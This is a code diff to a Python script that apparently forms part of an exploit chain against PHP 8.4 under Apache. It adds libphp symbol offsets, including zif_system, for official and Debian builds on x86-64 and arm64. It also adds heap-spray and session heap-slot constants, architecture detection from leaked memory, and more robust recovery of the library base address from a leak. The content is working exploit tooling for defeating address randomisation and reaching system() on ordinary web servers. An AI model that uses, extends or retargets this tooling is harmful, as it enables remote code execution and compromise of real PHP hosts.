@@ -38,13 +38,76 @@ import sys
 from collections import Counter
 from urllib.parse import unquote_to_bytes
 
-# Defaults are the arm64 offsets of php:8.4.26-apache (see ../gdb/README.md).
-DEFAULT_SYMBOLS = {
-    "zval_ptr_dtor": 0x638120,
-    "zend_hash_destroy": 0x5eefc8,
-    "php_url_encode": 0x484820,
-    "zif_system": 0x42cd70,
+# Offsets inside libphp, keyed by architecture, PHP version and - for distribution packages - the
+# distribution. Two keys with the same version are different binaries: `8.4.26` is the official
+# php:8.4.26-apache image, `8.4.24+debian13` is Debian's libapache2-mod-php8.4 8.4.24-1~deb13u1
+# (build-id a53126ca5ef3f1c12e9bd48cf7cccd63698fc818). A package build never silently inherits the
+# official-image offsets. The architecture is never guessed from the build number either - probe.php
+# reports it, the leak also reveals it, and --arch overrides both.
+#
+# Besides the symbols a profile carries the two heap slots (s_off, hsv_off) and the arming/spray
+# shape (spray_first, fillers, sid_field), because those are build constants too. `hsv` is the
+# zend_reference that php_session_track_init stores in ps_globals+0x168, not a string.
+SYMBOL_PROFILES = {
+    "x86_64/8.4.26": {
+        "zval_ptr_dtor": 0x65EB60,
+        "zend_hash_destroy": 0x6138F0,
+        "php_url_encode": 0x4BC590,
+        "zif_system": 0x465370,
+        "s_off": 0xF8398,
+        "hsv_off": 0x7D720,
+        "spray_first": 8,
+        "fillers": 115,
+    },
+    "arm64/8.4.26": {
+        "zval_ptr_dtor": 0x638120,
+        "zend_hash_destroy": 0x5eefc8,
+        "php_url_encode": 0x484820,
+        "zif_system": 0x42cd70,
+        "s_off": 0xF8398,
+        "hsv_off": 0x7D720,
+        "spray_first": 8,
+        "fillers": 115,
+    },
+    "x86_64/8.4.24+debian13": {
+        "zval_ptr_dtor": 0x424FF0,
+        "zend_hash_destroy": 0x3D9570,
+        "php_url_encode": 0x2A4250,
+        "zif_system": 0x24CDD0,
+        "s_off": 0xF7398,
+        "hsv_off": 0x7D6E0,
+        "spray_first": 8,
+        "fillers": 116,
+        "sid_field": 1,
+    },
+    "arm64/8.4.24+debian13": {
+        "zval_ptr_dtor": 0x41F9E0,
+        "zend_hash_destroy": 0x3D32E0,
+        "php_url_encode": 0x289E60,
+        "zif_system": 0x230FB0,
+        "s_off": 0xF7398,
+        "hsv_off": 0x7D720,
+        "spray_first": 8,
+        "fillers": 116,
+        "sid_field": 1,
+    },
 }
+DEFAULT_PROFILE = "arm64/8.4.26"
+DEFAULT_SYMBOLS = SYMBOL_PROFILES[DEFAULT_PROFILE]
+
+
+def profile_key(arch, version, distro):
+    """Name of the offset profile for a target, preferring the distribution-specific one.
+
+    A version alone is only enough for the official image; a package build of the same version is a
+    different binary whose offsets are tens of MB away. Falling back to the version key when the
+    distribution has no profile keeps the old behaviour for the official image.
+    """
+    if distro:
+        specific = "%s/%s+%s" % (arch, version, distro)
+        if specific in SYMBOL_PROFILES:
+            return specific
+    return "%s/%s" % (arch, version)
 
 CHUNK_MASK = ~0x1FFFFF  # Zend MM chunks are 2 MiB aligned
 
@@ -54,6 +117,10 @@ CHUNK_MASK = ~0x1FFFFF  # Zend MM chunks are 2 MiB aligned
 # now the one that is true on any 64-bit target: above the null page, and in the lower canonical half.
 MIN_PTR = 0x0000_0000_0001_0000      # above the null page
 MAX_PTR = 0x0000_8000_0000_0000      # bit 47 clear: user space on 4- and 5-level paging
+# A load base is a real mapping, so it sits far above the null page. Pointer-shaped integers in the
+# leak (0x100000000, 0x700000000, 0x1600000000) pass the pointer test and otherwise outvote the module
+# base by sheer count, which then also breaks the chunk selection that keys off it.
+MIN_BASE = 0x0000_0002_0000_0000
 
 
 def load_cookie(args):
@@ -105,6 +172,30 @@ def looks_like_pointer(qword):
     return MIN_PTR <= qword < MAX_PTR
 
 
+def detect_arch(blob):
+    """Guess the architecture from the leaked pointer set, or None when it is not clear.
+
+    The arm64 kernel hands out mmap addresses from the very top of the 47-bit space, so bits 32..47 of
+    every chunk base there are 0x7ff0..0x7fff. x86-64 randomises over a much wider band (0x74xx..0x7fxx
+    in the runs we have) and lands there about once in four thousand. That is a heuristic, not a
+    measurement: probe.php reports php_uname('m') and wins when it is available, and --arch overrides
+    both.
+
+    The vote is taken over chunk bases, not over every pointer-shaped qword. The window also carries
+    small integers (0x100000000, 0x1600000000) that pass looks_like_pointer(), and counting them once
+    pushed an arm64 leak below the old 90% threshold - the heap sat at 0x7ffe..., not 0x7fff..., which
+    made the whole run take the x86-64 offsets.
+    """
+    qwords = [int.from_bytes(blob[i:i + 8], "little") for i in range(0, len(blob) - 7, 8)]
+    chunks = [q & CHUNK_MASK for q in qwords if MIN_BASE <= q < MAX_PTR]
+    if len(chunks) < 64:
+        return None
+    top = Counter((q >> 32) & 0xFFFF for q in chunks).most_common(1)[0]
+    if top[0] >= 0x7FF0 and top[1] * 2 >= len(chunks):
+        return "arm64"
+    return "x86_64"
+
+
 def slide_pointers(blob):
     """Collect (offset, qword) for every 8-byte window that holds a pointer."""
     hits = []
@@ -127,7 +218,9 @@ def summarise(blob, symbols):
     for qword, count in sorted(repeated, key=lambda item: -item[1]):
         for name, offset in symbols.items():
             candidate = qword - offset
-            if candidate & 0xFFF:  # a load base is page aligned
+            if candidate & 0xFFF or candidate < MIN_BASE:  # a load base is page aligned and high
+                continue
+            if top_base and abs(candidate - top_base) > (512 << 20):
                 continue
             symbol_hits.append({"symbol": name, "qword": qword, "count": count, "base": candidate})
 
@@ -138,24 +231,21 @@ def summarise(blob, symbols):
     for qword in set(qwords):
         for name, offset in symbols.items():
             candidate = qword - offset
-            if candidate & 0xFFF or not (MIN_PTR <= candidate < MAX_PTR):
+            if candidate & 0xFFF or not (MIN_BASE <= candidate < MAX_PTR):
+                continue
+            if top_base and abs(candidate - top_base) > (512 << 20):
                 continue
             votes[candidate] += 1
 
-    base_votes = Counter(hit["base"] for hit in symbol_hits)
-    libphp_base, libphp_votes = (base_votes.most_common(1)[0] if base_votes else (0, 0))
-    if not libphp_base and votes:
-        best, count = votes.most_common(1)[0]
-        if count >= 2:
-            libphp_base, libphp_votes = best, count
-
     # A single symbol offset can be enough: 900 nested POST arrays put ~900 copies of
     # zval_ptr_dtor into the window, so one fingerprint backed by a large cluster is much stronger
-    # evidence than two coincidences. Weight each candidate base by how many pointers support it.
+    # evidence than two coincidences. Rank by the number of pointers behind a candidate, not by how
+    # many different symbols happen to hit it - two symbols landing on a 4-pointer page used to win
+    # over one symbol with 876 pointers.
     weighted = Counter()
     for hit in symbol_hits:
         weighted[hit["base"]] += hit["count"]
-    libphp_weight = weighted.get(libphp_base, 0)
+    libphp_base, libphp_weight = (weighted.most_common(1)[0] if weighted else (0, 0))
 
     return {
         "decoded_bytes": len(blob),
@@ -169,7 +259,7 @@ def summarise(blob, symbols):
         "repeated_qwords": len(repeated),
         "symbol_hits": symbol_hits[:10],
         "libphp_base": libphp_base,
-        "libphp_votes": libphp_votes,
+        "libphp_votes": libphp_weight,
         "libphp_weight": libphp_weight,
     }
 
